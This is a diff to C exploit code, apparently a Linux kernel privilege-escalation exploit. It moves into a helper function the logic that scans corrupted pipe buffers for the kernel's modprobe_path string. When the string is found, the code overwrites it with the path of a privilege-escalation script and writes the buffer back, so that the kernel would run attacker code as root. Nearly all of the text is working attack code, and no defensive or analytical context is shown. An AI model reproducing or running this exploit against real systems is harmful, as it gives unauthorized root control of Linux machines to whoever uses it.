@@ -210,6 +210,28 @@ int act(int act_fd, int code, int n, char *args)
 	return EXIT_SUCCESS;
 }
 
+int search_and_overwrite_modprobe(int pipe_fds[PIPES_N][2], char *pipe_data,
+				  const char *modprobe_path, const char *privesc_script_path,
+				  int victim_pipe)
+{
+	size_t modprobe_len = strlen(modprobe_path);
+	size_t script_len = strlen(privesc_script_path);
+
+	for (int j = 0; j <= (PIPE_CAPACITY - modprobe_len); j += 8) {
+		if (memcmp(pipe_data + j, modprobe_path, modprobe_len) == 0) {
+			printf("[+] located \"%s\" at offset 0x%lx of pipe #%d\n", modprobe_path,
+			       (unsigned long)j, victim_pipe);
+			memcpy(pipe_data + j, privesc_script_path, script_len);
+			if (write(pipe_fds[victim_pipe][1], pipe_data, PIPE_CAPACITY) < 0) {
+				perror("[-] write");
+				exit(EXIT_FAILURE);
+			}
+			return EXIT_SUCCESS;
+		}
+	}
+	return EXIT_FAILURE;
+}
+
 int main(void)
 {
 	int ret = EXIT_FAILURE;
@@ -292,24 +314,12 @@ int main(void)
 				perror("[-] read");
 				goto end;
 			}
-			for (int j = 0; j <= (sizeof(pipe_data) - sizeof(modprobe_path)); j += 8) {
-				/* clang-format off */
-				if (memcmp(pipe_data + j, modprobe_path, sizeof(modprobe_path)) == 0) {
-					printf("[+] located \"%s\" at offset 0x%lx of pipe #%d\n",
-					       modprobe_path, (unsigned long)j, i);
-					memcpy(pipe_data + j, privesc_script_path,
-					       sizeof(privesc_script_path));
-					if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
-						perror("[-] write");
-						goto end;
-					} /* clang-format on */
-					success = true;
-					break;
-				}
-			}
-			if (success)
+			ret = search_and_overwrite_modprobe(pipe_fds, pipe_data, modprobe_path,
+							    privesc_script_path, i);
+			if (ret == EXIT_SUCCESS) {
+				success = true;
 				break;
-			else {
+			} else {
 				/*
 				* If we scan current pipe and it is not corrupted,
 				* we will write back exactly the same data we read.
